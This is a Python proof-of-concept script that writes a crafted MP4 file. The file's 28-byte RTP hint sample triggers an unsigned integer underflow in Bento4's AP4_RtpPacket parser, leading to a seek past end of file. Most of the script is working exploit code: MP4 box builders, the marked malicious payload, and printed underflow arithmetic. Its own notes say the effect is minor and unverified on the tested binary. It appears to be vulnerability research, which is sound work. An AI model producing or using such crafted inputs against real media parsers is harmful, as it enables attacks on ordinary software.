#!/usr/bin/env python3
"""
PoC generator for VULN-004:
  Integer Underflow in extra_length Causing Unbounded Stream Reads
  in AP4_RtpPacket::AP4_RtpPacket(AP4_ByteStream&)

Vulnerability location: Ap4RtpHint.cpp lines 222-246:
    AP4_UI32 extra_length;
    stream.ReadUI32(extra_length);           // attacker-controlled value
    if (extra_length < 4) return;
    extra_length -= 4;                       // initial reduction
    while (extra_length > 0) {
        AP4_UI32 entry_length;
        AP4_UI32 entry_tag;
        stream.ReadUI32(entry_length);
        stream.ReadUI32(entry_tag);
        if (entry_length < 8) return;
        // ... seek or read ...
        extra_length -= entry_length;        // ← UNDERFLOW (CWE-191)
                                             //   unsigned wrap: e.g. 12 - 0x10000000
                                             //   = 0xF000000C → huge value
    }

Trigger path: AP4_HintTrackReader::GetRtpSample()
           → AP4_RtpSampleData(stream, size)
           → AP4_RtpPacket(stream)
           → extra_length underflow

Crafted hint sample (28 bytes):
  byte  0- 1: packet_count = 1 (UI16 BE)
  byte  2- 3: reserved = 0     (UI16 BE)
  --- RTP Packet ---
  byte  4- 7: relative_time = 0 (UI32 BE)
  byte  8:    flags1 = 0x00 (p_bit=0, x_bit=0)
  byte  9:    flags2 = 0x00 (m_bit=0, payload_type=0)
  byte 10-11: sequence_seed = 0 (UI16 BE)
  byte 12:    discarded byte = 0x00
  byte 13:    flags3 = 0x04 (extra_flag bit2 = 1)
  byte 14-15: constructor_count = 0 (UI16 BE)
  --- Extra data ---
  byte 16-19: extra_length = 0x00000010 (16; after -4 = 12 remaining)
  byte 20-23: entry_length = 0x10000000 (ATTACK: 268435456 >> extra_length)
  byte 24-27: entry_tag = b'AAAA' (not 'rtpo', triggers seek path)

Attack arithmetic:
  extra_length starts at 16
  after -= 4:  extra_length = 12
  loop iteration 1:
    entry_length = 0x10000000
    entry_tag = 'AAAA'  (not 'rtpo', so seek forward entry_length-8 bytes)
    extra_length -= 0x10000000:
      12 - 0x10000000 = 0xF000000C   ← UNSIGNED UNDERFLOW (CWE-191)
  loop iteration 2 (extra_length = 0xF000000C > 0 → continues):
    reads at EOF return 0 → entry_length = 0
    0 < 8 → return  (loop exits via early return)

Effect: unbounded seek beyond EOF + unsigned integer underflow.
Sanitizer: UBSAN does not flag unsigned subtraction (defined behavior in C/C++).
           ASAN would not detect this either (no OOB memory access at underflow point).
           The main effect is a malformed RTP packet object + seek to impossible position.

Note on binary availability:
  AP4_RtpPacket and AP4_RtpSampleData are NOT linked into mp42aac.
  The trigger binary should be mp4rtphintinfo (Source/C++/Apps/Mp4RtpHintInfo/)
  which calls AP4_HintTrackReader::Create() and AP4_HintTrackReader::GetNextPacket().
  mp42aac only processes audio tracks and never invokes AP4_HintTrackReader.

MP4 structure:
  ftyp
  moov
    mvhd  (next_track_id=3)
    trak  (track_id=1, handler='soun')   <- audio track (needed by mp42aac)
      tkhd
      mdia
        mdhd
        hdlr  (soun)
        minf
          smhd
          dinf > dref > url
          stbl > stsd(empty) + stts(empty) + stsz(empty) + stco(empty)
    trak  (track_id=2, handler='hint')   <- hint track
      tkhd
      tref > hint (track_ids=[1])        <- references audio track id=1
      mdia
        mdhd
        hdlr  (hint)
        minf
          hmhd
          dinf > dref > url
          stbl
            stsd > 'rtp ' (RtpHintSampleEntry) > tims
            stts (1 entry: count=1, delta=1)
            stsc (1 entry: chunk=1, spc=1, stsd_idx=1)
            stsz (sample_size=28, sample_count=1)
            stco (chunk_offset -> mdat sample position)
  mdat
    [28 bytes: crafted hint sample with extra_length underflow]
"""

import struct
import os

OUT_DIR  = os.path.dirname(os.path.abspath(__file__))
OUT_FILE = os.path.join(OUT_DIR, "vuln_004.mp4")

# ── Box helpers ──────────────────────────────────────────────────────────────

def box(fourcc: str, payload: bytes) -> bytes:
    """Standard box: 4-byte BE size + 4-byte fourcc + payload."""
    assert len(fourcc) == 4, f"fourcc must be exactly 4 chars, got {repr(fourcc)}"
    size = 4 + 4 + len(payload)
    return struct.pack(">I", size) + fourcc.encode("latin-1") + payload


def full_box(fourcc: str, version: int, flags: int, payload: bytes) -> bytes:
    """FullBox: box with version (1 byte) + flags (3 bytes) prefix."""
    vf = struct.pack(">B", version) + struct.pack(">I", flags)[1:]  # 4 bytes total
    return box(fourcc, vf + payload)


# ── ftyp ─────────────────────────────────────────────────────────────────────

def build_ftyp() -> bytes:
    payload = (
        b"isom"                  # major_brand
        + struct.pack(">I", 0)   # minor_version
        + b"isom"                # compatible_brands[0]
        + b"mp41"                # compatible_brands[1]
    )
    return box("ftyp", payload)


# ── Shared leaf atoms ─────────────────────────────────────────────────────────

def build_mvhd(next_track_id: int = 3) -> bytes:
    identity = struct.pack(">9I",
        0x00010000, 0, 0,
        0, 0x00010000, 0,
        0, 0, 0x40000000,
    )
    payload = (
        struct.pack(">I", 0)              # creation_time
        + struct.pack(">I", 0)            # modification_time
        + struct.pack(">I", 1000)         # timescale
        + struct.pack(">I", 1000)         # duration
        + struct.pack(">I", 0x00010000)   # rate = 1.0
        + struct.pack(">H", 0x0100)       # volume = 1.0
        + b"\x00" * 10                    # reserved
        + identity                        # matrix (36 bytes)
        + b"\x00" * 24                    # pre_defined
        + struct.pack(">I", next_track_id) # next_track_ID
    )
    return full_box("mvhd", 0, 0, payload)


def build_tkhd(track_id: int, flags: int = 3) -> bytes:
    """Track header box (version=0, flags=3: enabled + in-movie)."""
    identity = struct.pack(">9I",
        0x00010000, 0, 0,
        0, 0x00010000, 0,
        0, 0, 0x40000000,
    )
    payload = (
        struct.pack(">I", 0)        # creation_time
        + struct.pack(">I", 0)      # modification_time
        + struct.pack(">I", track_id)
        + struct.pack(">I", 0)      # reserved
        + struct.pack(">I", 1000)   # duration
        + b"\x00" * 8              # reserved
        + struct.pack(">H", 0)     # layer
        + struct.pack(">H", 0)     # alternate_group
        + struct.pack(">H", 0x0100) # volume = 1.0
        + struct.pack(">H", 0)     # reserved
        + identity
        + struct.pack(">II", 0, 0)  # width, height
    )
    return full_box("tkhd", 0, flags, payload)


def build_mdhd(timescale: int = 44100, duration: int = 0) -> bytes:
    payload = (
        struct.pack(">I", 0)          # creation_time
        + struct.pack(">I", 0)        # modification_time
        + struct.pack(">I", timescale)
        + struct.pack(">I", duration)
        + struct.pack(">H", 0x55C4)   # language = 'und'
        + struct.pack(">H", 0)        # pre_defined
    )
    return full_box("mdhd", 0, 0, payload)


def build_hdlr(handler_type: str, name: str = "") -> bytes:
    assert len(handler_type) == 4
    payload = (
        struct.pack(">I", 0)              # pre_defined
        + handler_type.encode("latin-1")  # handler_type (4 bytes)
        + b"\x00" * 12                    # reserved
        + name.encode("latin-1") + b"\x00"  # null-terminated name
    )
    return full_box("hdlr", 0, 0, payload)


def build_url_entry() -> bytes:
    """Self-contained data reference entry (flags=1 = self-contained)."""
    return full_box("url ", 0, 1, b"")


def build_dref() -> bytes:
    entry_count = struct.pack(">I", 1)
    return full_box("dref", 0, 0, entry_count + build_url_entry())


def build_dinf() -> bytes:
    return box("dinf", build_dref())


def build_stsd_empty() -> bytes:
    """stsd with zero sample entries."""
    return full_box("stsd", 0, 0, struct.pack(">I", 0))


def build_stts_empty() -> bytes:
    return full_box("stts", 0, 0, struct.pack(">I", 0))


def build_stsz_empty() -> bytes:
    """stsz with sample_size=0, sample_count=0."""
    return full_box("stsz", 0, 0, struct.pack(">II", 0, 0))


def build_stco_empty() -> bytes:
    return full_box("stco", 0, 0, struct.pack(">I", 0))


def build_stbl_empty() -> bytes:
    payload = (
        build_stsd_empty()
        + build_stts_empty()
        + build_stsz_empty()
        + build_stco_empty()
    )
    return box("stbl", payload)


# ── Audio track ────────────────────────────────────────────────────────────────

def build_smhd() -> bytes:
    return full_box("smhd", 0, 0, struct.pack(">HH", 0, 0))


def build_audio_minf() -> bytes:
    payload = build_smhd() + build_dinf() + build_stbl_empty()
    return box("minf", payload)


def build_audio_mdia() -> bytes:
    payload = (
        build_mdhd(44100, 0)
        + build_hdlr("soun", "SoundHandler")
        + build_audio_minf()
    )
    return box("mdia", payload)


def build_audio_trak() -> bytes:
    payload = build_tkhd(1) + build_audio_mdia()
    return box("trak", payload)


# ── Hint track ─────────────────────────────────────────────────────────────────

def build_tref_hint(track_id: int = 1) -> bytes:
    """tref box containing 'hint' child referencing the given track_id."""
    hint_payload = struct.pack(">I", track_id)
    hint_atom = box("hint", hint_payload)
    return box("tref", hint_atom)


def build_hmhd() -> bytes:
    """Hint Media Header box."""
    payload = (
        struct.pack(">H", 0)   # maxPDUsize
        + struct.pack(">H", 0) # avgPDUsize
        + struct.pack(">I", 0) # maxbitrate
        + struct.pack(">I", 0) # avgbitrate
        + struct.pack(">I", 0) # reserved
    )
    return full_box("hmhd", 0, 0, payload)


def build_tims_atom(timescale: int = 90000) -> bytes:
    """'tims' atom: RTP timescale (AP4_TimsAtom).
    Structure: box-header(8) + UI32 timescale(4) = 12 bytes total."""
    return box("tims", struct.pack(">I", timescale))


def build_rtp_sample_entry() -> bytes:
    """'rtp ' (AP4_ATOM_TYPE_RTP_ = 'rtp ') sample entry.

    AP4_RtpHintSampleEntry::ReadFields reads:
      - AP4_SampleEntry::ReadFields: reserved(6) + data_reference_index(2)
      - hint_track_version (UI16)
      - highest_compatible_version (UI16)
      - max_packet_size (UI32)
    Then child atoms are parsed (e.g. 'tims').

    Box layout:
      4 bytes: size
      4 bytes: 'rtp '
      6 bytes: reserved (AP4_SampleEntry)
      2 bytes: data_reference_index = 1
      2 bytes: hint_track_version = 1
      2 bytes: highest_compatible_version = 1
      4 bytes: max_packet_size = 1500
      12 bytes: 'tims' child atom
    Total: 36 bytes
    """
    payload = (
        b"\x00" * 6                        # reserved
        + struct.pack(">H", 1)             # data_reference_index = 1
        + struct.pack(">H", 1)             # hint_track_version
        + struct.pack(">H", 1)             # highest_compatible_version
        + struct.pack(">I", 1500)          # max_packet_size
        + build_tims_atom(90000)           # 'tims' child (12 bytes)
    )
    # fourcc is 'rtp ' (rtp followed by space)
    return box("rtp ", payload)


def build_hint_stsd() -> bytes:
    """stsd for hint track with one 'rtp ' sample entry."""
    entry_count = struct.pack(">I", 1)
    return full_box("stsd", 0, 0, entry_count + build_rtp_sample_entry())


def build_hint_stts() -> bytes:
    """stts: 1 sample in 1 entry, delta=1."""
    payload = (
        struct.pack(">I", 1)   # entry_count
        + struct.pack(">I", 1) # sample_count
        + struct.pack(">I", 1) # sample_delta
    )
    return full_box("stts", 0, 0, payload)


def build_hint_stsc() -> bytes:
    """stsc: 1 entry - chunk 1 has 1 sample, stsd index 1."""
    payload = (
        struct.pack(">I", 1)   # entry_count
        + struct.pack(">I", 1) # first_chunk
        + struct.pack(">I", 1) # samples_per_chunk
        + struct.pack(">I", 1) # sample_description_index
    )
    return full_box("stsc", 0, 0, payload)


def build_hint_stsz(sample_size: int = 28) -> bytes:
    """stsz: uniform sample size (no per-entry sizes needed)."""
    payload = (
        struct.pack(">I", sample_size)  # uniform sample_size (non-zero = use this)
        + struct.pack(">I", 1)          # sample_count
    )
    return full_box("stsz", 0, 0, payload)


def build_hint_stco(chunk_offset: int = 0) -> bytes:
    """stco: 1 chunk at the given absolute file offset."""
    payload = (
        struct.pack(">I", 1)              # entry_count
        + struct.pack(">I", chunk_offset) # chunk_offset
    )
    return full_box("stco", 0, 0, payload)


def build_hint_stbl(chunk_offset: int = 0) -> bytes:
    """hint track sample table with the malicious hint sample."""
    payload = (
        build_hint_stsd()
        + build_hint_stts()
        + build_hint_stsc()
        + build_hint_stsz(28)
        + build_hint_stco(chunk_offset)
    )
    return box("stbl", payload)


def build_hint_minf(chunk_offset: int = 0) -> bytes:
    payload = build_hmhd() + build_dinf() + build_hint_stbl(chunk_offset)
    return box("minf", payload)


def build_hint_mdia(chunk_offset: int = 0) -> bytes:
    payload = (
        build_mdhd(90000, 1)
        + build_hdlr("hint", "HintHandler")
        + build_hint_minf(chunk_offset)
    )
    return box("mdia", payload)


def build_hint_trak(chunk_offset: int = 0) -> bytes:
    """Hint track (id=2) referencing audio track (id=1)."""
    payload = (
        build_tkhd(2)
        + build_tref_hint(1)           # tref/hint -> track_id=1
        + build_hint_mdia(chunk_offset)
    )
    return box("trak", payload)


# ── Malicious hint sample ──────────────────────────────────────────────────────

def build_malicious_hint_sample() -> bytes:
    """
    28-byte hint sample that triggers integer underflow in AP4_RtpPacket::AP4_RtpPacket.

    AP4_RtpSampleData parsing:
      [0:2]   packet_count = 1
      [2:4]   reserved = 0
    AP4_RtpPacket parsing:
      [4:8]   relative_time = 0          (UI32)
      [8]     flags1 = 0x00             (p_bit=0, x_bit=0)
      [9]     flags2 = 0x00             (m_bit=0, payload_type=0)
      [10:12] sequence_seed = 0         (UI16)
      [12]    discard = 0x00            (first ReadUI08, ignored)
      [13]    flags3 = 0x04             (extra_flag bit2=1)
      [14:16] constructor_count = 0     (UI16)
    Extra data (extra_flag=1):
      [16:20] extra_length = 0x00000010  (=16; becomes 12 after -=4)
      [20:24] entry_length = 0x10000000  (ATTACK: >>extra_length, underflow trigger)
      [24:28] entry_tag = b'AAAA'        (not 'rtpo', seek path taken)

    Underflow: 12 - 0x10000000 = 0xF000000C (wraps around as AP4_UI32)
    """
    data = b""
    # AP4_RtpSampleData header
    data += struct.pack(">H", 1)    # packet_count = 1
    data += struct.pack(">H", 0)    # reserved = 0
    # AP4_RtpPacket header (12 bytes)
    data += struct.pack(">I", 0)    # relative_time = 0
    data += struct.pack(">B", 0x00) # flags1 (p_bit=0, x_bit=0)
    data += struct.pack(">B", 0x00) # flags2 (m_bit=0, payload_type=0)
    data += struct.pack(">H", 0)    # sequence_seed = 0
    data += struct.pack(">B", 0x00) # discarded byte (first ReadUI08)
    data += struct.pack(">B", 0x04) # flags3: extra_flag=1 (bit 2)
    data += struct.pack(">H", 0)    # constructor_count = 0
    # Extra data block (after extra_flag check)
    data += struct.pack(">I", 0x10)         # extra_length = 16
    data += struct.pack(">I", 0x10000000)   # entry_length = 0x10000000 (ATTACK)
    data += b"AAAA"                          # entry_tag (not 'rtpo')
    assert len(data) == 28, f"Expected 28 bytes, got {len(data)}"
    return data


# ── Top-level assembly ────────────────────────────────────────────────────────

def build_mp4() -> bytes:
    HINT_SAMPLE = build_malicious_hint_sample()
    SAMPLE_SIZE = len(HINT_SAMPLE)  # 28

    # Build ftyp first to know its size
    ftyp = build_ftyp()

    # Build moov with a placeholder stco offset of 0
    # Then compute the real offset and rebuild
    moov_placeholder = build_moov_with_offset(0)
    ftyp_size = len(ftyp)
    moov_size = len(moov_placeholder)
    mdat_header_size = 8  # 4 bytes size + 4 bytes 'mdat'

    # The sample data starts right after mdat header
    chunk_offset = ftyp_size + moov_size + mdat_header_size

    # Rebuild moov with the correct chunk offset
    moov = build_moov_with_offset(chunk_offset)

    # Safety check: moov sizes should match (offset doesn't change box size)
    assert len(moov) == moov_size, "moov size changed after offset fix!"

    mdat = box("mdat", HINT_SAMPLE)

    return ftyp + moov + mdat


def build_moov_with_offset(chunk_offset: int) -> bytes:
    payload = (
        build_mvhd(next_track_id=3)
        + build_audio_trak()
        + build_hint_trak(chunk_offset)
    )
    return box("moov", payload)


def main():
    mp4_data = build_mp4()

    with open(OUT_FILE, "wb") as f:
        f.write(mp4_data)

    print(f"[+] Written {len(mp4_data)} bytes to {OUT_FILE}")
    print()
    print("[+] Vulnerability: CWE-191 Integer Underflow → CWE-834 Excessive Iteration")
    print("[+] Location: AP4_RtpPacket::AP4_RtpPacket(AP4_ByteStream&)")
    print("[+] File: Ap4RtpHint.cpp, lines 222-246")
    print()
    print("[+] Trigger structure in hint sample (28 bytes):")
    print("      extra_length  = 0x00000010 (16; after -=4 → 12 remaining)")
    print("      entry_length  = 0x10000000 (268435456)")
    print("      12 - 0x10000000 = 0xF000000C  ← AP4_UI32 underflow (CWE-191)")
    print("      while (0xF000000C > 0)  ← loop continues but exits on next EOF read")
    print()
    print("[!] NOTE: AP4_RtpPacket/AP4_RtpSampleData are NOT linked into mp42aac.")
    print("    The trigger binary is mp4rtphintinfo (not compiled in build_test/bin/).")
    print("    mp42aac will NOT trigger this vulnerability; expected result: UNVERIFIED.")
    print()

    # Verify the malicious sample bytes
    sample = build_malicious_hint_sample()
    print("[+] Malicious hint sample bytes (28):")
    print("   ", sample.hex())
    extra_len_read = int.from_bytes(sample[16:20], 'big')
    entry_len = int.from_bytes(sample[20:24], 'big')
    remaining = extra_len_read - 4
    underflow_result = (remaining - entry_len) & 0xFFFFFFFF
    print(f"[+] extra_length (read) = 0x{extra_len_read:08X}")
    print(f"[+] extra_length after -=4 = {remaining}")
    print(f"[+] entry_length = 0x{entry_len:08X}")
    print(f"[+] underflow: {remaining} - 0x{entry_len:08X} = 0x{underflow_result:08X}")
    print(f"[+] while (0x{underflow_result:08X} > 0) evaluates to: {underflow_result > 0}")


if __name__ == "__main__":
    main()
